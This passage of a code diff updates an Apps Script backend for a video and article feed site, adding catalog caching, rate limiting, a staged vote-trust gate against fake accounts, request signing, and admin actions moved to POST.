@@ -27,6 +27,7 @@ const SPREADSHEET_IDS = {
   BLOCKED:      '1ZNePTyTIZsM73WW4nC3AwSb27oDjVoftjJJeWTajjL0',
   LOGS:         '1C6kVxkdANBBech6sDPRye62Mo4MdeSrGCkY78ZHi_9s',
   CLIENT_ERRORS:'1jTR_cz0F4qBgzQm0pNx3t6Gfc0zCFIFTOsa8jXo6s6E',
+  CUSTOMERS:    '1vMKv5f59lsAQQwmN4I04-OJRGyRrZW2GWAI-Lc52ico',
 };
 
 // ============================================================
@@ -37,10 +38,15 @@ const SPREADSHEET_IDS = {
 // every JSON response and served via ?action=version, so the live deployment
 // is always identifiable. The frontend has its own APP_VERSION in
 // js/config.js; see CHANGELOG.md at the repo root.
-const VERSION = '1.14.0';
+const VERSION = '1.26.2';
 
 const DEFAULT_REFRESH_HOURS = 4;
 const DEFAULT_PAGE_LIMIT = 20;
+// Hard ceiling on any client-supplied page size (BE11). Without it, `&limit=100000`
+// forces the read handlers to slice — and, on a cache miss, serialize — the entire
+// catalog. The feed head / top-week caches are far smaller than this, so a real
+// page never approaches the cap; it only defuses abusive requests.
+const MAX_PAGE_LIMIT = 100;
 
 // Wall-clock budget for a single crawl. Apps Script hard-kills executions at
 // 6 min; on a kill the finally blocks don't run, last_fetch never updates, and
@@ -62,6 +68,36 @@ const FEED_HEAD_COUNT = 50;
 const FEED_HEAD_CACHE_KEY = 'feed_head_v1';
 const FEED_HEAD_CACHE_SECONDS = 300;
 
+// Whole-catalog cache: the ENTIRE sorted live catalog, so every request the
+// head cannot answer — cursor pages (page 2+ of the feed), offset pages past
+// the head, and the search index's limit=100 chunks — is a cache read instead
+// of a full Videos-sheet scan + sort. Measured 2026-10-06: a browser's first
+// search focus fired 22 limit=100 feed pages, each a full scan of ~2100 rows
+// (2.4-7.7s, 30s+ under contention); together with every scrolled cursor page
+// those scans were most of the ~590k executions/week that drove the project
+// to Google's simultaneous-executions limit. The payload (~1.2MB) is far past
+// CacheService's 100KB/key cap, so the shared sorted-list cache splits big
+// values into chunks (see cachePutChunked). Same TTL/invalidation as the head:
+// every writer that changes a row bumps the generation, which stales both.
+const CATALOG_CACHE_KEY = 'catalog_sorted_v1';
+const CATALOG_CACHE_SECONDS = 300;
+// Longest a request waits for another execution's in-flight rebuild of a
+// cached sorted list before scanning the sheet itself (see cachedSortedList).
+// Well past a normal scan (2-4s) so waiters coalesce onto one rebuild even on
+// a slow day, but short of the 6-minute execution limit so a wedged holder
+// can never take the waiters down with it.
+const SORTED_LIST_REBUILD_LOCK_MS = 30000;
+// Chunk size for cached values. Chunks are ASCII-escaped before splitting so
+// one char is one byte, keeping each piece comfortably under the 100KB cap.
+const CACHE_CHUNK_CHARS = 90000;
+
+// Short-lived "no such video" marker for the single-video lookup (BE11). A shared
+// deep link to a bogus id otherwise forces handleVideo through readSortedCatalog() AND
+// readSortedArchive() — two full scans — on every hit; a repeated bogus id would
+// re-run both each time. Caching the miss for a few seconds lets a burst of the
+// same bad id short-circuit to not-found without touching the sheets.
+const VIDEO_MISS_CACHE_SECONDS = 30;
+
 // Top-This-Week cache: the ranked last-7-days window is kept in CacheService so
 // repeat opens of the tab skip the full Videos-sheet scan + sort — the same
 // dominant cost the feed head avoids. handleTopWeek is read-only and has no
@@ -74,7 +110,71 @@ const FEED_HEAD_CACHE_SECONDS = 300;
 const TOP_WEEK_CACHE_COUNT = 50;
 const TOP_WEEK_CACHE_KEY = 'top_week_v1';
 const TOP_WEEK_CACHE_SECONDS = 300;
+// Top-This-Week ranking weight: every this-many views counts as one upvote in
+// the score (floor division — 4999 views add nothing). The score is derived at
+// sort time from the stored vote_count and view_count, so it needs no column
+// of its own: the crawl refreshes view counts and already invalidates the
+// top-week cache, which re-ranks the window on the next read. Mirrored by
+// CONFIG.TOP_WEEK_VIEWS_PER_VOTE in js/config.js — keep the two in sync.
+const TOP_WEEK_VIEWS_PER_VOTE = 5000;
 const RATE_LIMIT_SECONDS = 30; // Min seconds between comments per user
+// Per-user minimum spacing between vote/star/bookmark toggles (SEC3/BE5). Each toggle takes
+// the global script lock through a sheet mutation, so an account toggling in a
+// tight loop serializes every other write and churns the caches. A short
+// CacheService-backed window (keyed by email) throttles that without a Meta write.
+const VOTE_STAR_RATE_LIMIT_SECONDS = 2;
+
+// ------------------------------------------------------------
+// Vote trust / anti-Sybil (SEC-Sybil, phased rollout)
+// ------------------------------------------------------------
+// Ranking manipulation is the real residual risk: the API is world-callable
+// with any Google account, and Top This Week ranks on vote_count, so a pool of
+// fresh accounts can vault (or bury) a video. Request signing is only a speed
+// bump (its secret is public). The durable defense is here: a vote from a
+// LOW-TENURE account is still recorded (the button lights up, myVotes reflects
+// it), but it does NOT contribute to the ranking vote_count until the account
+// has been seen on the site for TRUST_TENURE_HOURS. A brand-new Sybil pool
+// therefore can't move a score at all; gaming now costs days of pre-farming
+// instead of being free and instant.
+//
+// "Tenure" = time since the account's first_seen_at in CUSTOMERS (its first
+// sign-in here), NOT Google account age — Google ID tokens don't expose account
+// age. A patient attacker can pre-register and wait; that's the accepted limit.
+//
+// Consistency: each Votes row carries a `counted` flag (see VOTE_HEADERS) set at
+// insert from the voter's tenure. Un-voting decrements vote_count only if the
+// row was counted, so a vote cast while untrusted and withdrawn after the
+// account ages in never drifts the count. The reconcile recount likewise totals
+// only counted rows. Legacy rows predating the column are treated as counted.
+const TRUST_TENURE_HOURS = 24;
+// Meta overrides (tune without a redeploy): `vote_trust_tenure_hours` sets the
+// window; `vote_trust_enabled`='true' turns ENFORCEMENT on. While enforcement is
+// off (the rollout default), tenure is still computed and anomalies still
+// logged, but every vote counts — observe-only, so the change ships dark and the
+// logs show what WOULD be gated before the gate goes live.
+const VOTE_TRUST_ENABLED_META_KEY = 'vote_trust_enabled';
+const VOTE_TRUST_TENURE_META_KEY = 'vote_trust_tenure_hours';
+// Per-video untrusted-vote velocity: this many low-tenure new votes on one video
+// inside the window logs a single "possible vote manipulation" WARN for operator
+// review. Detection is visibility only — the count gate is the actual defense,
+// so a viral video is never auto-hidden by a false positive.
+const VOTE_ANOMALY_WINDOW_SECONDS = 3600;
+const VOTE_ANOMALY_BURST_THRESHOLD = 8;
+// Cache TTL for a resolved first_seen_at (epoch ms), keyed by email hash. Once an
+// account is seen its first_seen never changes, so it's cached for CacheService's
+// maximum (6h). It is written at BOOTSTRAP (sign-in already has the row in hand)
+// as well as on a vote-time miss, so the common vote path is a cache hit and
+// never rescans CUSTOMERS — the tenure gate adds ~nothing to a vote's latency.
+const FIRST_SEEN_CACHE_SECONDS = 21600;
+// When the tenure clock started. `first_seen_at` was introduced with the
+// CUSTOMERS sheet (Backend 1.20.0/1.21.0, shipped 2026-09-22), so every account
+// that existed before then was stamped at that moment — its "tenure" is time
+// since the column appeared, not time since it joined. Until one full trust
+// window has elapsed past this point, EVERY pre-existing account reads as
+// low-tenure and enforcement would gate the whole user base. So enforcement is
+// inert before CLOCK_START + trust window regardless of the Meta toggle
+// (isVoteTrustEnforced). Conservative (later than the true first stamp) is safe.
+const VOTE_TRUST_CLOCK_START_ISO = '2026-09-22T16:12:05Z';
 
 // Grace window applied to a premiere/live entry's expiry. A scheduled premiere
 // that never airs, or a stream that never ends, stops being surfaced once its
@@ -85,13 +185,26 @@ const LIVE_GRACE_MS = 12 * 60 * 60 * 1000;
 // "Archive" tab at the end of each crawl. readAllVideos scans and sorts the
 // WHOLE live sheet on every cache miss, so an ever-growing catalog is the one
 // cost that eventually times a request out against Apps Script's 6-min cap;
-// pruning keeps that scan bounded. The window is far larger than any channel's
-// ~15-entry RSS feed reaches, so an archived item is never re-fetched and
-// re-appended, and the feed head, Top-This-Week, and starred feeds all live
-// comfortably inside it. Archived rows are retained (not deleted), just no
-// longer scanned.
+// pruning keeps that scan bounded. A slow channel's ~15-entry RSS window CAN
+// reach past this cutoff (an article site posting monthly serves year-old
+// items forever), so the crawl seeds its dedup sets from the Archive tab as
+// well as the live sheet — otherwise every crawl re-ingests those items and
+// end-of-crawl pruning re-archives them, minting one duplicate Archive row per
+// item per crawl. The feed head, Top-This-Week, and starred feeds all live
+// comfortably inside the window. Archived rows are retained (not deleted),
+// just no longer scanned.
 const PRUNE_AFTER_DAYS = 60;
 const ARCHIVE_SHEET_NAME = 'Archive';
+
+// Hard retention age for the Archive tab itself. pruneOldVideos only ever
+// APPENDS aged-out rows here, so without a second stage the tab grows without
+// bound — eventually timing its own rewrite against the 6-minute execution cap
+// and creeping toward the 10M-cell spreadsheet limit. pruneOldArchive drops
+// Archive rows whose published_at is older than this. Kept far larger than
+// PRUNE_AFTER_DAYS so nothing the live feed, Top-This-Week, or a recent deep
+// link could reach is ever removed — only deep-history items no page still
+// pages back to.
+const ARCHIVE_MAX_AGE_DAYS = 365;
 
 // The Archive tab, sorted newest-first, is cached whole so the frontend's
 // multi-page full-history index build costs one scan+sort per cache window
@@ -100,12 +213,28 @@ const ARCHIVE_SHEET_NAME = 'Archive';
 const ARCHIVE_CACHE_KEY = 'archive_sorted_v1';
 const ARCHIVE_CACHE_SECONDS = 600;
 
+// Monotonic cache generation. Every cached sorted-list payload (feed head,
+// Top-This-Week, archive) is stamped with the generation current when its source
+// sheet was read; a read serves a payload only while its stamp still matches, and
+// a populate refuses to install a payload whose captured stamp is already behind.
+// Bumped by every writer's invalidate*, this closes the repopulation-vs-
+// invalidation race: a read that started before a concurrent write can no longer
+// re-install its pre-write snapshot for the full TTL. Stored as a Script Property
+// (survives across executions/isolates, where the race actually lives).
+const CACHE_GENERATION_PROP = 'CACHE_GENERATION';
+
 // OAuth client ID this app's Google Sign-In tokens are minted for. Every ID
 // token MUST carry this as its `aud` claim, or it was issued to a different
 // site and must be rejected — Google's tokeninfo endpoint validates the token
 // signature and expiry but NOT the audience. Keep in sync with GOOGLE_CLIENT_ID
 // in js/app.js.
 const GOOGLE_CLIENT_ID = '58088759188-uhqgajeoe8h218h3o6pql634pkcjsu70.apps.googleusercontent.com';
+
+// How long a token that failed LOCAL pre-validation (decoded, but wrong audience /
+// issuer / already expired) is remembered so a repeat of the same bad token is
+// refused without re-decoding or hitting tokeninfo (SEC1/BE4). Short by design —
+// this is a flood damper, not an authorization decision.
+const TOKEN_NEG_CACHE_SECONDS = 60;
 
 // App-issued session tokens. After the first Google Sign-In we verify the
 // Google ID token ONCE, then mint our own HMAC-signed token the client reuses
@@ -117,11 +246,70 @@ const GOOGLE_CLIENT_ID = '58088759188-uhqgajeoe8h218h3o6pql634pkcjsu70.apps.goog
 const SESSION_TTL_DAYS = 30;
 const SESSION_TOKEN_PREFIX = 'wds1.';
 
+// ------------------------------------------------------------
+// Request signing (SEC-Sybil, phased rollout)
+// ------------------------------------------------------------
+// Every write POST from the frontend carries a timestamped HMAC (`ts` + `sig`
+// in the body) so the write endpoints can reject requests that don't originate
+// from a client that ran our signing code. This is a SPEED BUMP, not an
+// authorization boundary: the frontend is a static site with no build step, so
+// REQUEST_SIGNING_SECRET necessarily ships in js/config.js and is readable in
+// View Source. What it buys us:
+//   - drive-by curl/bot abuse that never bothers to read the JS is rejected;
+//   - a stale replayed request is rejected once it falls outside the skew window.
+// What it does NOT stop: an attacker who reads config.js and replicates the
+// signing (the real Sybil case). The durable defenses for that are the Google
+// Sign-In gate already on these endpoints plus server-side account-age /
+// vote-anomaly checks (a separate, secret-free change). Keep this honest in
+// code so nobody mistakes it for real auth.
+//
+// The secret is duplicated, verbatim, as CONFIG.REQUEST_SIGNING_SECRET in
+// js/config.js — keep the two in sync. Rotating it invalidates in-flight
+// requests from older cached frontends, so rotate only alongside a frontend
+// deploy (and, if `require_signature` is on, a brief soft window).
+const REQUEST_SIGNING_SECRET = '34d720bfa37ac54ff4a75065950ebd0017404951a73f89a97ada58da56271b62';
+
+// Accept a signed request whose timestamp is within this much of server time.
+// Wide enough to tolerate client clock skew and in-flight latency; narrow
+// enough that a captured signature stops working the same session. Replay
+// INSIDE the window is possible and accepted — acceptable because the Google
+// token underneath still authorizes the actual user/action.
+const SIGNATURE_MAX_SKEW_MS = 5 * 60 * 1000;
+
+// The POST actions the frontend signs (everything a normal signed-in user does).
+// Admin actions (addChannel/logs/enrich/refresh) are omitted: they carry their
+// own shared-secret/token gate and are low-volume operator calls, so requiring a
+// request signature on them would only complicate manual operator tooling
+// without adding a defense their token gate doesn't already provide. The
+// unauthenticated `clientError` telemetry endpoint is likewise omitted (it has
+// its own budgeted rate limits).
+const SIGNED_ACTIONS = {
+  comment: true, vote: true, star: true, bookmark: true, emailConsent: true, feedback: true,
+  myVotes: true, myStars: true, myBookmarks: true, session: true, bootstrap: true,
+};
+
+// Meta toggle gating ENFORCEMENT. While absent/anything-but-'true', a missing or
+// bad signature is logged but the request still proceeds (soft launch), so a
+// backend deploy can precede the frontend and older cached clients keep working.
+// Flip the `require_signature` Meta row to 'true' once signing frontends have
+// rolled out and old ones have aged past their cache TTL; from then a signed
+// action with a missing/invalid/stale signature is rejected.
+const REQUIRE_SIGNATURE_META_KEY = 'require_signature';
+
 const LOG_LEVELS = { DEBUG: 0, INFO: 1, WARN: 2, ERROR: 3 };
 
 // Cache per execution
 let _cachedLogLevel = null;
 let _cachedSessionSecret = null;
+// The whole Meta sheet, read once per execution and served from memory. getMeta
+// is called repeatedly per request (last_fetch, refresh_interval_hours, and twice
+// per channel for youtube_api_key), and a full getDataRange() scan per call got
+// slower as rows accrued. setMeta keeps this in sync on write.
+let _cachedMeta = null;
+// The CUSTOMERS spreadsheet handle, opened once per execution. A vote opens it
+// for the voter's tenure (Customers tab) AND for the Votes tab; openById is the
+// expensive part, so the second open is served from here.
+let _cachedCustomersSS = null;
 
 
 // ============================================================
@@ -141,6 +329,19 @@ function findVideoIdCol(headers) {
   var col = headers.indexOf('video_id');
   if (col === -1) col = headers.indexOf('item_id');
   return col;
+}
+
+/**
+ * True if `s` is a well-formed public id: a string of 1-64 chars drawn only
+ * from the id alphabet [A-Za-z0-9_-]. YouTube ids are 11 chars and article
+ * ids are already alphanumeric, so this rejects both junk-row flooding and
+ * formula-shaped payloads (=, +, quotes, parens) before any write handler
+ * trusts a client-supplied id.
+ * @param {*} s
+ * @returns {boolean}
+ */
+function isValidId(s) {
+  return typeof s === 'string' && /^[A-Za-z0-9_-]{1,64}$/.test(s);
 }
 
 /**
@@ -210,21 +411,25 @@ function doGet(e) {
       case 'getChannels':
         return jsonResponse(handleGetChannels());
       case 'refresh':
-        // Side-effectful: kicks off a full crawl that spends UrlFetch and
-        // YouTube Data API quota. Admin-only — the scheduled trigger and the
-        // stale-feed auto-refresh cover the routine case; this is a manual
-        // override, not an endpoint anonymous callers may spin.
-        if (!isAdmin(e.parameter.token)) {
-          return jsonResponse({ status: 'error', message: 'Unauthorized' });
-        }
-        return jsonResponse(handleRefresh());
+        // Moved to POST (see doPost). A GET carried the admin token in the
+        // query string, where it leaks into browser history, referrer headers,
+        // proxy logs, and Apps Script's own execution/access logs — the exact
+        // reason `logs`/`enrich`/`addChannel` are POST-only. Kept here as an
+        // explicit 405-style rejection so an old bookmark fails loudly (and
+        // never with the token still in the URL doing anything) instead of
+        // silently hitting the "Unknown action" default.
+        return jsonResponse({ status: 'error', message: 'refresh is POST-only' });
       case 'version':
         return jsonResponse({ status: 'ok' });
       default:
         return jsonResponse({ status: 'error', message: 'Unknown action: ' + action });
     }
   } catch (error) {
-    log('ERROR', 'doGet', error.message);
+    // Nothing between here and the response may throw: the log write touches
+    // the Meta and LOGS sheets, and the failure being reported is very often
+    // the Spreadsheet service itself. log() guards its own sheet access, but
+    // the response must not depend on that holding for every future edit.
+    try { log('ERROR', 'doGet', error.message); } catch (e) { /* response first */ }
     // Generic message to the client — the detail is in the log, not the wire.
     return jsonResponse({ status: 'error', message: 'Request failed. Please try again.' });
   }
@@ -234,6 +439,13 @@ function doPost(e) {
   try {
     var data = JSON.parse(e.postData.contents);
     var action = data.action || '';
+
+    // Request-signature gate (SEC-Sybil). No-op for unsigned/admin actions and,
+    // during soft launch, for a bad signature too; only rejects once the Meta
+    // `require_signature` toggle is on. Placed before the switch so every signed
+    // action is covered uniformly.
+    var sigError = enforceRequestSignature(data);
+    if (sigError) return jsonResponse(sigError);
 
     switch (action) {
       case 'comment':
@@ -246,23 +458,57 @@ function doPost(e) {
         return jsonResponse(handleStar(data));
       case 'myStars':
         return jsonResponse(handleMyStars(data));
+      case 'bookmark':
+        return jsonResponse(handleBookmark(data));
+      case 'myBookmarks':
+        return jsonResponse(handleMyBookmarks(data));
+      case 'emailConsent':
+        return jsonResponse(handleEmailConsent(data));
+      case 'feedback':
+        return jsonResponse(handleFeedback(data));
       case 'bootstrap':
         return jsonResponse(handleBootstrap(data));
       case 'session':
         return jsonResponse(handleSession(data));
       case 'clientError':
         return jsonResponse(handleClientError(data));
+      case 'addChannel':
+        // Gated by the add-channel page's own password (its META row), over
+        // POST so it never lands in a URL/query log.
+        if (!isAddChannelAuthorized(data.token)) {
+          return jsonResponse({ status: 'error', message: 'Wrong password' });
+        }
+        return jsonResponse(handleAddChannel(data));
       case 'logs':
         // Admin-only, over POST so the token never lands in a URL/query log.
         if (!isAdmin(data.token)) {
           return jsonResponse({ status: 'error', message: 'Unauthorized' });
         }
         return jsonResponse(handleLogs(data));
+      case 'enrich':
+        // Admin-only, over POST like `logs`. Runs the channel-onboarding
+        // backfill (enrichChannels) remotely — the same code path as the
+        // editor's Run button, for operators without editor access. It
+        // spends UrlFetch quota on external sites, hence the token gate.
+        if (!isAdmin(data.token)) {
+          return jsonResponse({ status: 'error', message: 'Unauthorized' });
+        }
+        return jsonResponse(handleEnrich());
+      case 'refresh':
+        // Admin-only manual crawl override, over POST so the admin token
+        // travels in the body and never in a URL/query log (mirrors `logs`
+        // and `enrich`). The scheduled trigger and stale-feed auto-refresh
+        // cover the routine case; this is the operator's manual kick.
+        if (!isAdmin(data.token)) {
+          return jsonResponse({ status: 'error', message: 'Unauthorized' });
+        }
+        return jsonResponse(handleRefresh());
       default:
         return jsonResponse({ status: 'error', message: 'Unknown action: ' + action });
     }
   } catch (error) {
-    log('ERROR', 'doPost', error.message);
+    // Same contract as doGet: the response never depends on the log write.
+    try { log('ERROR', 'doPost', error.message); } catch (e) { /* response first */ }
     // Generic message to the client — the detail is in the log, not the wire.
     return jsonResponse({ status: 'error', message: 'Request failed. Please try again.' });
   }
@@ -283,6 +529,22 @@ function isAdmin(token) {
   return constantTimeEquals(String(token), String(adminToken));
 }
 
+/**
+ * Constant-time check of the add-channel page's password against the
+ * `add_channel_password` row in META. Deliberately a SEPARATE secret from
+ * admin_token: the form's password can be shared with a co-editor without
+ * also granting the admin endpoints (refresh, logs). Fails CLOSED when the
+ * row is missing or blank — no password configured means nobody can add.
+ *
+ * @param {string} token
+ * @returns {boolean}
+ */
+function isAddChannelAuthorized(token) {
+  var password = getMeta('add_channel_password');
+  if (!password || !token) return false;
+  return constantTimeEquals(String(token), String(password));
+}
+
 function jsonResponse(data) {
   // Every response carries the deployed backend version, so any client (or
   // a plain curl) can tell which deployment answered.
@@ -301,28 +563,30 @@ function jsonResponse(data) {
 // ============================================================
 
 /**
- * Checks if a user is posting too frequently.
- * Stores last comment timestamp per email in Meta sheet.
- * 
- * @param {string} email - User's email
- * @returns {boolean} True if rate limited
+ * CacheService-backed per-user rate limiter for the lockful write endpoints
+ * (comments, votes, stars). A single check-and-set: if a marker for
+ * `action`+`email` is already present the caller is inside the window and is
+ * blocked; otherwise it's stamped for `windowSeconds` and allowed through. The
+ * stamp is ephemeral (self-expires with the TTL) and never touches the Meta
+ * config sheet, so no commenter PII is stored and no rate_ rows grow unbounded.
+ * Best-effort — a cache failure fails OPEN (a legitimate action is never blocked
+ * by infra trouble).
+ *
+ * @param {string} action - short bucket name, e.g. 'comment' | 'vote' | 'star'
+ * @param {string} email  - the acting user's email (the rate-limit key)
+ * @param {number} windowSeconds - minimum spacing between actions
+ * @returns {boolean} true when the action should be BLOCKED
  */
-function isRateLimited(email) {
-  var key = 'rate_' + email;
-  var lastComment = getMeta(key);
-  
-  if (!lastComment) return false;
-  
-  var elapsed = (Date.now() - new Date(lastComment).getTime()) / 1000;
-  return elapsed < RATE_LIMIT_SECONDS;
-}
-
-/**
- * Records a comment timestamp for rate limiting.
- * @param {string} email 
- */
-function recordCommentTime(email) {
-  setMeta('rate_' + email, new Date().toISOString());
+function isActionRateLimited(action, email, windowSeconds) {
+  try {
+    var cache = CacheService.getScriptCache();
+    var key = 'rl_' + action + '_' + email;
+    if (cache.get(key)) return true;
+    cache.put(key, '1', windowSeconds);
+    return false;
+  } catch (e) {
+    return false; // fail open — never block a real user on a cache hiccup
+  }
 }
 
 // ============================================================
@@ -387,9 +651,53 @@ function scheduleRefresh() {
     ScriptApp.newTrigger('kickoffRefresh').timeBased().after(1000).create();
     log('INFO', 'scheduleRefresh', 'Async refresh scheduled');
   } catch (e) {
-    log('ERROR', 'scheduleRefresh', e.message);
+    var msg = (e && e.message) ? String(e.message) : String(e);
+    // A missing script.scriptapp scope surfaces here as a permission error, and
+    // on this deployment that is the PERMANENT state, not an incident: adding
+    // the scope to oauthScopes puts the ANONYMOUS web app into a
+    // re-authorization state and 403s the live /exec (backend 1.14.3, reverted
+    // in 1.14.4). handleFeed calls scheduleRefresh on EVERY request while the
+    // feed is stale, so logging per occurrence buried the log under one ERROR
+    // per visitor. Report it once an hour at WARN and stay quiet in between.
+    // Match on the scope URL — it is the one part of the message Google does
+    // NOT localize (the text arrives in the script owner's locale, e.g.
+    // Hebrew).
+    if (msg.indexOf('script.scriptapp') !== -1) {
+      if (firstInWindow_('scheduleRefresh:no-scriptapp-scope', 3600)) {
+        log('WARN', 'scheduleRefresh', 'Async refresh unavailable: this deployment has no ' +
+          'script.scriptapp scope, so no refresh trigger can be installed. The 4h scheduled ' +
+          'crawl is unaffected. Suppressing for 1h. (' + msg + ')');
+      }
+      return;
+    }
+    // Anything else: one ERROR per occurrence, with the exception NAME too —
+    // without it a permission failure is invisible and the async auto-refresh
+    // would silently never install its trigger.
+    log('ERROR', 'scheduleRefresh', (e && e.name ? e.name + ': ' : '') + msg);
   } finally {
     lock.releaseLock();
+  }
+}
+
+/**
+ * True the first time `key` is seen in a `seconds`-long window, false for every
+ * call until that window expires — a log-rate limiter for a condition that
+ * recurs on every request. Cache-backed, so it is best-effort by design: an
+ * eviction or a CacheService outage just lets one extra line through, which is
+ * the right direction to fail for a log.
+ *
+ * @param {string} key
+ * @param {number} seconds
+ * @returns {boolean}
+ */
+function firstInWindow_(key, seconds) {
+  try {
+    var cache = CacheService.getScriptCache();
+    if (cache.get(key)) return false;
+    cache.put(key, '1', seconds);
+    return true;
+  } catch (e) {
+    return true; // never let the rate limiter swallow what it is limiting
   }
 }
 
@@ -454,11 +762,39 @@ function setupScheduledRefresh() {
 }
 
 /**
+ * Enrichment pass run ahead of the scheduled crawl, so a URL pasted into a new
+ * CHANNELS row by a sheet editor (no script access needed) goes live on the
+ * next cycle: the blanks are filled, the row is enabled, and the crawl that
+ * follows in this same execution picks it up. When every row is already
+ * enriched this costs one sheet read — enrichChannels only fetches for rows
+ * with blanks to fill. A bad row or a scrape outage must never cost the crawl,
+ * so failures are contained here.
+ *
+ * @returns {{processed:number, filled:number, results:Object[]}|null} The
+ *   enrichChannels summary, or null when enrichment itself failed.
+ */
+function runScheduledEnrichment() {
+  try {
+    var summary = enrichChannels();
+    if (summary.processed > 0) {
+      log('INFO', 'scheduledFetchAllFeeds', 'Enriched ' + summary.processed +
+        ' channel row(s), filled ' + summary.filled + ' cell(s)');
+    }
+    return summary;
+  } catch (e) {
+    log('ERROR', 'scheduledFetchAllFeeds', 'Channel enrichment failed: ' + e.message);
+    return null;
+  }
+}
+
+/**
  * Entry point called by the time-based trigger.
- * Wraps fetchAllFeeds with logging/error handling.
+ * Enriches freshly pasted CHANNELS rows, then wraps fetchAllFeeds with
+ * logging/error handling.
  */
 function scheduledFetchAllFeeds() {
   log('INFO', 'scheduledFetchAllFeeds', 'Scheduled refresh starting');
+  runScheduledEnrichment();
   try {
     var stats = fetchAllFeeds();
     log('INFO', 'scheduledFetchAllFeeds', 'Completed. New: ' + stats.new_videos + ', Errors: ' + stats.errors);
@@ -471,7 +807,18 @@ function scheduledFetchAllFeeds() {
 // RSS FEED FETCHING
 // ============================================================
 
-function fetchAllFeeds() {
+/**
+ * Crawls every enabled channel, or — when onlyFeedUrl is given — just the one
+ * channel whose feed_url matches. The single-feed form backs handleAddChannel:
+ * it is bounded work (one feed fetch) that fits inside a web-app request, so a
+ * newly added channel has content immediately instead of waiting for the 4h
+ * trigger. It shares this function's one-crawl-at-a-time marker, so it can
+ * never append against the same stale dedup snapshot as a running full crawl.
+ *
+ * @param {string} [onlyFeedUrl] - restrict the crawl to this feed_url
+ * @returns {{new_videos:number, errors:number, skipped?:boolean}}
+ */
+function fetchAllFeeds(onlyFeedUrl) {
   // One crawl at a time. Concurrent runs (scheduled trigger + stale-feed
   // web requests) raced each other: both self-initialized columns, both
   // appended rows against the same stale dedup snapshot, and both wrote
@@ -498,7 +845,7 @@ function fetchAllFeeds() {
   }
 
   try {
-    return crawlAllFeeds();
+    return crawlAllFeeds(onlyFeedUrl);
   } finally {
     setMeta('fetch_in_progress', '');
   }
@@ -539,7 +886,15 @@ function handleGetChannels() {
 
   var headers = data[0];
   var enabledCol = headers.indexOf('enabled');
+  var feedUrlCol = headers.indexOf('feed_url');
   var channels = [];
+
+  // BE14: publish ONLY the fields the frontend renders — the Channels-tab card
+  // (channel_name, url, avatar) plus the search host-map (host). Copying every
+  // column (the old behavior) leaked any operator-added column — notes, contact,
+  // a per-channel key — into this anonymous response the moment it was created.
+  // `platform` below is computed, not copied: feed_url itself stays private.
+  var PUBLIC_FIELDS = ['channel_name', 'host', 'url', 'avatar'];
 
   for (var i = 1; i < data.length; i++) {
     var row = data[i];
@@ -549,14 +904,21 @@ function handleGetChannels() {
 
     var channel = {};
     for (var j = 0; j < headers.length; j++) {
-      channel[headers[j]] = row[j];
+      if (PUBLIC_FIELDS.indexOf(headers[j]) !== -1) channel[headers[j]] = row[j];
     }
 
-    if (!channel.avatar && channel.url) {
-      var domain = extractDomain(channel.url);
-      if (domain && !/(^|\.)youtube\.com$/i.test(domain) && domain !== 'youtu.be') {
-        channel.avatar = 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(domain) + '&sz=128';
-      }
+    // Platform for the Channels-tab badge/filter. The public url is the
+    // authority, but rows onboarded from a pasted feed URL can have url blank —
+    // fall back to feed_url (crawled, so always present). A source either has
+    // a YouTube link or it's an article site, so nothing ships unclassified.
+    var feedUrl = feedUrlCol === -1 ? '' : String(row[feedUrlCol] || '');
+    var srcUrl = String(channel.url || '') || feedUrl;
+    var domain = extractDomain(srcUrl);
+    var isYouTube = /(^|\.)youtube\.com$/i.test(domain) || domain === 'youtu.be';
+    channel.platform = isYouTube ? 'youtube' : 'article';
+
+    if (!channel.avatar && domain && !isYouTube) {
+      channel.avatar = 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(domain) + '&sz=128';
     }
 
     channels.push(channel);
@@ -565,9 +927,15 @@ function handleGetChannels() {
   return { status: 'ok', channels: channels };
 }
 
-function crawlAllFeeds() {
+/**
+ * @param {string} [onlyFeedUrl] - when set, every channel whose feed_url differs
+ *   is skipped, and the whole-catalog bookkeeping (resume index, last_fetch,
+ *   retention pruning) is left to the full crawl that owns it.
+ */
+function crawlAllFeeds(onlyFeedUrl) {
   // Wall-clock deadline (production runtime timing — NOT a test stopwatch).
   var crawlStartMs = new Date().getTime();
+  var targetFeed = onlyFeedUrl ? String(onlyFeedUrl).trim() : '';
 
   var channelsSheet = getSheet('CHANNELS');
   var videosSheet = getSheet('VIDEOS');
@@ -583,6 +951,7 @@ function crawlAllFeeds() {
   // Get existing video IDs for deduplication
   var existingVideos = {};
   var existingRowById = {}; // video_id -> 1-based sheet row, for view-count refresh
+  var existingUrlById = {}; // video_id -> stored url, for the Shorts URL self-heal
   // Existing normalized URLs, keyed exactly as dedupeByUrl keys them
   // (trim().toLowerCase()). A feed that normally parses as XML but hits the
   // regex fallback once produces a DIFFERENT id for every item (parseRss2 hashes
@@ -593,9 +962,25 @@ function crawlAllFeeds() {
   var existingUrls = {};
   var videoData = videosSheet.getDataRange().getValues();
   var vHeaders = videoData.length > 0 ? videoData[0] : [];
-  // A blank sheet reads back as [['']] — treat that as "no headers" so the
-  // empty-sheet fallback path (below) runs instead of self-init corrupting it.
+  // A blank sheet reads back as [['']] — treat that as "no headers".
   if (vHeaders.length === 1 && vHeaders[0] === '') vHeaders = [];
+
+  // BE13: A totally empty Videos sheet has no header row at all. Write the
+  // canonical header FIRST, so the self-init column checks and the header-driven
+  // append path below operate on real column names and every row lands under the
+  // right key. The old behavior left vHeaders empty and fell through to a
+  // hardcoded 13-column append that wrote NO header (and omitted the
+  // live_status/scheduled_start/expires_at trio); normalizeVideoRows then
+  // mistook the first data row for the header and a later crawl overwrote a data
+  // cell with the literal 'view_count'.
+  if (vHeaders.length === 0) {
+    vHeaders = [
+      'video_id', 'channel_name', 'title', 'url', 'published_at', 'fetched_at',
+      'tier', 'category', 'comment_count', 'vote_count', 'media_type',
+      'preview_image', 'view_count', 'live_status', 'scheduled_start', 'expires_at'
+    ];
+    videosSheet.getRange(1, 1, 1, vHeaders.length).setValues([vHeaders]);
+  }
 
   // Self-initialize: add the view_count column if the sheet predates view tracking
   var viewCountCol = vHeaders.indexOf('view_count');
@@ -629,13 +1014,60 @@ function crawlAllFeeds() {
         existingRowById[videoData[i][videoIdCol]] = i + 1;
         if (urlCol0 !== -1 && videoData[i][urlCol0]) {
           existingUrls[String(videoData[i][urlCol0]).trim().toLowerCase()] = true;
